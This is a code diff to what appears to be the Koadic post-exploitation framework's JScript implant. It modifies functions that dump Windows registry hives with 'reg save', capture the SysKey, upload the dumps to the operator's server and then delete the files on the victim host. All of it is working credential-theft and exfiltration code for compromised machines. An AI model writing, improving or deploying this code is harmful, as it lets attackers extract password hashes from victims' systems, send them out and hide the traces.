@@ -21,6 +21,15 @@ function GetSysKey()
     var headers = {};
     headers["Task"] = "SysKey";
 
+    try
+    {
+        headers["encoder"] = Koadic.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
+    }
+    catch (e)
+    {
+        headers["encoder"] = "1252";
+    }
+
     Koadic.work.report(data, headers);
     Koadic.file.deleteFile(jdpath)
     Koadic.file.deleteFile(skew1path)
@@ -34,16 +43,7 @@ function DumpHive(name, uuid)
 
     Koadic.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);
 
-    var data = Koadic.file.readBinary(path);
-
-    data = data.replace(/\\/g, "\\\\");
-    data = data.replace(/\0/g, "\\0");
-
-    var headers = {};
-    headers["Task"] = name;
-
-    Koadic.work.report(data, headers);
-
+    Koadic.http.upload(path, name, "Task");
     Koadic.file.deleteFile(path);
 }
 
